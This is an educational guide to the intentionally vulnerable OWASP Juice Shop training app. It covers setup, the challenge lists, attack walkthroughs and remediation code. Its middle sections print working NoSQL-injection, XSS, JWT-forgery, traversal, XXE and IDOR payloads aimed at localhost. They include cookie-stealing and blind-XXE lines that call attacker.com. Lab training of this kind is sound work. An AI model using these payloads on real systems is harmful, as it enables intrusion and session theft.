# OWASP Juice Shop - Complete Educational Guide

## The Most Modern Insecure Web Application

---

## 1. Introduction

OWASP Juice Shop is an open-source, intentionally insecure web application designed for security training, awareness demonstrations, CTF competitions, and as a testing ground for security tools. It is an OWASP Flagship project and encompasses vulnerabilities from the entire OWASP Top Ten along with many other real-world security flaws.

### 1.1 What Makes Juice Shop Different?

Unlike DVWA, Juice Shop is a **modern** web application built with:
- **Frontend:** Angular (TypeScript)
- **Backend:** Node.js with Express
- **Database:** SQLite (default) or MongoDB
- **Architecture:** REST API-based, SPA (Single Page Application)
- **Challenges:** 100+ challenges across all OWASP categories

### 1.2 Project Facts

| Property | Value |
|----------|-------|
| Author | Bjoern Kimminich & OWASP Juice Shop contributors |
| License | MIT |
| GitHub Stars | 13,500+ |
| Forks | 18,800+ |
| Latest Release | v20.1.1 (June 2026) |
| Node.js Support | 22.x, 24.x, 26.x |
| Languages | TypeScript (64.1%), JavaScript (24.7%), HTML (6.3%) |

### 1.3 Use Cases

- **Security Training:** Teaching web application security concepts
- **Awareness Demos:** Demonstrating vulnerabilities to management
- **CTF Competitions:** Hosting hacking challenges
- **Tool Testing:** Trying out security scanners and tools
- **Developer Education:** Teaching secure coding practices

---

## 2. Architecture

### 2.1 Technology Stack

```
Frontend (Angular SPA)
    ├── Angular 19+
    ├── TypeScript
    ├── SCSS
    └── HTML5

Backend (Node.js/Express)
    ├── Express.js
    ├── Sequelize ORM
    ├── SQLite (default) / MongoDB
    └── RESTful API

Infrastructure
    ├── Docker support
    ├── Vagrant
    └── Pre-built packages
```

### 2.2 Directory Structure

```
juice-shop/
├── config/              # Configuration files
├── data/                # Database and data files
│   ├── sqlite/          # SQLite database
│   └── mongodb/         # MongoDB data
├── frontend/            # Angular application
│   └── src/
│       ├── app/         # Components
│       └── assets/      # Static files
├── lib/                 # Utility libraries
├── models/              # Database models
├── routes/              # API routes
├── test/                # Test files
├── app.ts               # Main application
├── server.ts            # Server entry point
├── Dockerfile           # Docker build
└── package.json         # Dependencies
```

### 2.3 Default Ports

| Service | Port |
|---------|------|
| Juice Shop | 3000 |
| Juice Shop (Kali) | 42000 |

---

## 3. Installation

### 3.1 Method 1: Kali Linux Package (Recommended)

```bash
# Install via apt
sudo apt update
sudo apt install juice-shop

# Start the service
sudo juice-shop-start

# Stop the service
sudo juice-shop-stop

# Access at http://localhost:42000
```

### 3.2 Method 2: Docker

```bash
# Pull and run
docker pull bkimminich/juice-shop
docker run --rm -p 127.0.0.1:3000:3000 bkimminich/juice-shop

# Access at http://localhost:3000
```

### 3.3 Method 3: From Source

```bash
# Clone repository
git clone https://github.com/juice-shop/juice-shop.git --depth 1
cd juice-shop

# Install dependencies
npm install

# Start application
npm start

# Access at http://localhost:3000
```

### 3.4 Method 4: Pre-built Packages

1. Download from [GitHub Releases](https://github.com/juice-shop/juice-shop/releases/latest)
2. Extract `juice-shop-<version>_<node-version>_<os>_x64.zip`
3. Run `npm start`
4. Browse to `http://localhost:3000`

---

## 4. Navigation and Interface

### 4.1 Main Interface

Juice Shop presents as a modern e-commerce site selling juice products:

- **Home:** Product listings and search
- **Products:** Individual product pages with reviews
- **Basket:** Shopping cart functionality
- **Checkout:** Payment and order processing
- **Account:** User registration and login
- **Contact:** Contact form
- **About:** Company information

### 4.2 Score Board

The score board tracks your progress through all challenges:

```
http://localhost:3000/#/score-board
```

### 4.3 Hacking Instructor

Juice Shop includes a built-in tutorial system called "Hacking Instructor" that guides you through solving challenges step by step.

---

## 5. Challenge Categories

### 5.1 Injection Attacks

| Challenge | Description | Difficulty |
|-----------|-------------|------------|
| API-only User | Solve challenge via API without UI | ★★★ |
| Forged Signed JWT | Create a valid JWT token | ★★★★ |
| Login Admin | Log in as administrator | ★ |
| JWT Issues | Exploit JWT vulnerabilities | ★★★ |
| NoSQL Injection | Bypass authentication via NoSQL | ★★ |
| Password Strength | Find weak password | ★★ |
| Reset Password | Reset another user's password | ★★★ |

### 5.2 XSS Challenges

| Challenge | Description | Difficulty |
|-----------|-------------|------------|
| API-only User | Solve via API | ★★★ |
| DOM XSS | Execute XSS via DOM manipulation | ★★ |
| Reflected XSS | Reflected cross-site scripting | ★★ |
| Stored XSS | Persistent cross-site scripting | ★★★ |

### 5.3 Broken Authentication

| Challenge | Description | Difficulty |
|-----------|-------------|------------|
| Login Admin | Admin credentials | ★ |
| Login MC SafeSearch | Find credentials | ★★ |
| Login Bender | Social engineering | ★★★ |
| Login Jim | Credential reuse | ★★ |
| Multiple Likes | Race condition exploitation | ★★★★ |

### 5.4 Sensitive Data Exposure

| Challenge | Description | Difficulty |
|-----------|-------------|------------|
| API Leak | Find API documentation | ★ |
| Database Schema | Find database schema | ★★ |
| Exposed Metrics | Access monitoring metrics | ★★ |
| GDPR Data Export | Access user data | ★★★ |
| Leaked Backup | Find backup files | ★★ |

### 5.5 Broken Access Control

| Challenge | Description | Difficulty |
|-----------|-------------|------------|
| Change Password | Change another user's password | ★★★ |
| Delete All Users | Delete all user accounts | ★★★★ |
| Forged Signed JWT | Create signed JWT | ★★★★ |
| Product Tampering | Modify product data | ★★ |
| Task List | Access other users' tasks | ★★ |

### 5.6 Security Misconfiguration

| Challenge | Description | Difficulty |
|-----------|-------------|------------|
| Deprecated Interface | Access deprecated endpoints | ★★ |
| Extra Language | Find hidden locale file | ★★ |
| Geo Stalking | Find location via metadata | ★★★ |
| Privacy Policy | Access privacy policy | ★ |
| Security Policy | Find security.txt | ★ |

### 5.7 XXE Attacks

| Challenge | Description | Difficulty |
|-----------|-------------|------------|
| Classic XXE | XML External Entity injection | ★★★ |
| XXE DoS | Denial of service via XXE | ★★★★ |

### 5.8 Using Components with Known Vulnerabilities

| Challenge | Description | Difficulty |
|-----------|-------------|------------|
| Expired Coupon | Find expired promotion code | ★★ |
| Known Vulnerable Components | Identify outdated libraries | ★★★ |
| Typosquatting | Find malicious npm package | ★★★ |

---

## 6. NoSQL Injection Attacks

### 6.1 Authentication Bypass

**Low Security - Basic NoSQL Injection:**

```bash
# Login with NoSQL injection
# Send POST request to /rest/user/login
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@juice-sh.op", "password": {"$gt": ""}}'

# Bypass with $ne (not equal)
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$ne": ""}, "password": {"$ne": ""}}'

# Exact match bypass
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$regex": "admin.*"}, "password": {"$ne": ""}}'
```

### 6.2 Data Extraction

```bash
# Extract user data via API
curl http://localhost:3000/api/Users

# Query with NoSQL operators
curl "http://localhost:3000/api/Products?name[$ne]="

# Find admin user
curl "http://localhost:3000/api/Users?email=admin@juice-sh.op"
```

### 6.3 Product Manipulation

```bash
# Modify product via API
curl -X PUT http://localhost:3000/api/Products/1 \
  -H "Content-Type: application/json" \
  -d '{"description": "Hacked!"}'
```

---

## 7. XSS Attacks

### 7.1 DOM-Based XSS

```html
<!-- Search function vulnerability -->
<iframe src="javascript:alert('XSS')">

<!-- Product search -->
<script>alert('XSS')</script>

<!-- Image tag -->
<img src=x onerror=alert('XSS')>
```

### 7.2 Reflected XSS

```html
<!-- URL parameter injection -->
http://localhost:3000/search?q=<script>alert('XSS')</script>

<!-- Encoded payloads -->
http://localhost:3000/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E
```

### 7.3 Stored XSS

```html
<!-- Review injection -->
<script>
// Steal cookies
fetch('http://attacker.com/steal?c=' + document.cookie);
</script>

<!-- Product review -->
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

### 7.4 XSS Payloads for Different Contexts

```javascript
// Inside <script> tags
</script><script>alert('XSS')</script>

// Inside HTML attributes
" onmouseover="alert('XSS')" "

// Inside JavaScript strings
'; alert('XSS'); //

// Inside onclick handlers
' + alert('XSS') + '

// Template injection
{{constructor.constructor('alert(1)')()}}
```

---

## 8. Broken Authentication and JWT

### 8.1 JWT Structure

```json
{
  "header": {
    "alg": "HS256",
    "typ": "JWT"
  },
  "payload": {
    "email": "admin@juice-sh.op",
    "iat": 1234567890,
    "exp": 9999999999
  }
}
```

### 8.2 JWT Manipulation

```bash
# Decode JWT (without verification)
echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d

# Modify payload and re-sign
# 1. Change algorithm to "none"
# 2. Modify email to admin
# 3. Sign with empty key

# Using jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt
python3 jwt_tool.py <JWT> -X a
python3 jwt_tool.py <JWT> -T -S rs256 -pr private.pem
```

### 8.3 JWT Attack Techniques

```bash
# Algorithm confusion (RS256 to HS256)
# Use public key as HMAC secret

# None algorithm bypass
{"alg":"none","typ":"JWT"}

# Key brute force
hashcat -m 16500 jwt.txt wordlist.txt

# JWT in localStorage
# Access via browser console:
localStorage.getItem('token')
```

### 8.4 Password Reset Exploitation

```bash
# Find password reset mechanism
curl http://localhost:3000/api/Passwords

# Abuse password reset
curl -X POST http://localhost:3000/api/Passwords \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@juice-sh.op"}'
```

---

## 9. Sensitive Data Exposure

### 9.1 Finding Leaked Data

```bash
# Check for backup files
curl http://localhost:3000/ftp/coupons_2013.csv
curl http://localhost:3000/ftp/package.json.bak
curl http://localhost:3000/ftp/www-data_2020-13-37.tar.gz

# Check for configuration files
curl http://localhost:3000/config/bazaarcms.yml
curl http://localhost:3000/robots.txt

# API documentation
curl http://localhost:3000/api-docs
curl http://localhost:3000/swagger.yml
```

### 9.2 Extracting Sensitive Information

```bash
# Database schema
curl http://localhost:3000/api/Products/Reviews

# User data
curl http://localhost:3000/api/Users

# Product metadata
curl http://localhost:3000/api/Products/1
```

### 9.3 File System Access

```bash
# Directory traversal
curl http://localhost:3000/api/Products/../../etc/passwd

# Local file inclusion
curl http://localhost:3000/rest/qrcode/image?file=../../etc/passwd
```

---

## 10. XXE (XML External Entity) Attacks

### 10.1 Basic XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<search>
  <query>&xxe;</query>
</search>
```

### 10.2 XXE via File Upload

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<orders>
  <order>
    <product>&file;</product>
  </order>
</orders>
```

### 10.3 Blind XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<search>test</search>
```

### 10.4 XXE DoS

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/random">
]>
<search>&xxe;</search>
```

---

## 11. Broken Access Control

### 11.1 IDOR (Insecure Direct Object References)

```bash
# Access other users' data
curl http://localhost:3000/api/Users/1
curl http://localhost:3000/api/Users/2
curl http://localhost:3000/api/Users/3

# Modify other users' data
curl -X PUT http://localhost:3000/api/Users/1 \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@juice-sh.op"}'
```

### 11.2 Privilege Escalation

```bash
# Change user role
curl -X PUT http://localhost:3000/api/Users/1 \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# Access admin endpoints
curl http://localhost:3000/api/Admin/
```

### 11.3 Forged Signed JWT

```bash
# Create admin JWT
python3 jwt_tool.py -T -S none \
  -S hs256 -pk public.pem \
  -I -pc email -pv admin@juice-sh.op \
  -I -pc role -pv admin
```

---

## 12. Security Misconfiguration

### 12.1 Finding Hidden Endpoints

```bash
# Deprecated interfaces
curl http://localhost:3000/rest/qrcode/image?data=admin

# Hidden files
curl http://localhost:3000/ftp/coupons_2013.csv
curl http://localhost:3000/ftp/legal.md

# API documentation
curl http://localhost:3000/api-docs/
```

### 12.2 Verbose Error Messages

```bash
# Trigger error messages
curl http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@juice-sh.op", "password": "wrong"}'
```

---

## 13. Challenge Solving Strategies

### 13.1 General Approach

1. **Read the Challenge Description:** Understand what's required
2. **Enumerate Endpoints:** Use browser dev tools and API documentation
3. **Test Input Validation:** Try special characters and payloads
4. **Check Response Headers:** Look for security headers and tokens
5. **Analyze Source Code:** Review frontend JavaScript
6. **Use API Directly:** Bypass frontend validation
7. **Document Everything:** Keep notes of successful techniques

### 13.2 Useful Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy and scanner |
| sqlmap | SQL injection automation |
| jwt_tool | JWT manipulation |
| ffuf | Directory fuzzing |
| curl | API testing |
| Postman | API development |
| browser dev tools | Frontend analysis |

### 13.3 Tips and Tricks

```bash
# Enable challenge hints in score board
# Each challenge has a "hint" button

# Check the API documentation regularly
curl http://localhost:3000/api-docs

# Use browser console to inspect localStorage
localStorage.getItem('token')
localStorage.getItem('challenge-solved')

# Monitor network requests in dev tools
# Look for interesting API calls
```

---

## 14. Integration with Burp Suite

### 14.1 Configuration

1. Set browser proxy to `127.0.0.1:8080`
2. Install Burp CA certificate
3. Browse to Juice Shop through Burp
4. Add to scope: `http://localhost:3000`

### 14.2 Useful Burp Features

- **Proxy:** Intercept and modify requests
- **Repeater:** Manual request manipulation
- **Intruder:** Automated attacks
- **Decoder:** Encode/decode payloads
- **Comparer:** Compare responses
- **Logger:** Track all requests

---

## 15. Score Board and Progress

### 15.1 Accessing Score Board

```
http://localhost:3000/#/score-board
```

### 15.2 Challenge Categories

- **Injection:** SQL, NoSQL, LDAP, OS Command
- **XSS:** Reflected, Stored, DOM
- **Broken Authentication:** JWT, Session Management
- **Sensitive Data Exposure:** Information Leakage
- **XML External Entities:** XXE Injection
- **Broken Access Control:** IDOR, Privilege Escalation
- **Security Misconfiguration:** Defaults, Debug Modes
- **Insecure Deserialization:** Object Injection
- **Vulnerable Components:** Outdated Libraries
- **Insufficient Logging:** Monitoring Gaps

### 15.3 Tracking Progress

```bash
# Check solved challenges via API
curl http://localhost:3000/api/Challenges

# Browser console
JSON.parse(localStorage.getItem('challenge-solved'))
```

---

## 16. Remediation Guidance

### 16.1 Preventing Injection

```javascript
// Use parameterized queries
const query = 'SELECT * FROM Users WHERE email = ?';
db.get(query, [email]);

// Validate input
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
if (!emailRegex.test(email)) {
  throw new Error('Invalid email');
}
```

### 16.2 Preventing XSS

```javascript
// Use template escaping
const safeHTML = escapeHtml(userInput);

// Set Content-Security-Policy header
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  next();
});
```

### 16.3 JWT Best Practices

```javascript
// Use strong secrets
const secret = process.env.JWT_SECRET;

// Validate algorithm
if (header.alg !== 'HS256') {
  throw new Error('Invalid algorithm');
}

// Check expiration
if (payload.exp < Date.now() / 1000) {
  throw new Error('Token expired');
}
```

### 16.4 Access Control

```javascript
// Implement proper authorization
app.get('/api/Users/:id', (req, res) => {
  if (req.user.id !== parseInt(req.params.id) && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  // ... fetch user data
});
```

---

## 17. Troubleshooting

### Common Issues

**Problem:** Application won't start

```bash
# Check Node.js version
node --version  # Should be 22.x, 24.x, or 26.x

# Clear npm cache
npm cache clean --force

# Reinstall dependencies
rm -rf node_modules
npm install
```

**Problem:** Port 3000 already in use

```bash
# Find and kill process
lsof -i :3000
kill -9 <PID>

# Or use different port
PORT=3001 npm start
```

**Problem:** Database errors

```bash
# Reset database
rm data/sqlite/juiceshop.sqlite
npm start
```

**Problem:** Docker issues

```bash
# Check Docker logs
docker logs <container_id>

# Rebuild image
docker build -t juice-shop .
```

---

## 18. Learning Resources

- [OWASP Juice Shop Official Site](https://owasp-juice.shop/)
- [Pwning OWASP Juice Shop (Free eBook)](https://leanpub.com/juice-shop)
- [Juice Shop GitHub](https://github.com/juice-shop/juice-shop)
- [OWASP Top Ten](https://owasp.org/www-project-top-ten/)
- [Juice Shop CTF](https://owasp.org/www-project-juice-shop/ctf/)

---

## References

- [Juice Shop Documentation](https://pwning.owasp-juice.shop/)
- [OWASP Juice Shop GitHub](https://github.com/juice-shop/juice-shop)
- [Juice Shop CTF Guide](https://github.com/juice-shop/juice-shop-ctf)
- [Pwning OWASP Juice Shop eBook](https://leanpub.com/juice-shop)
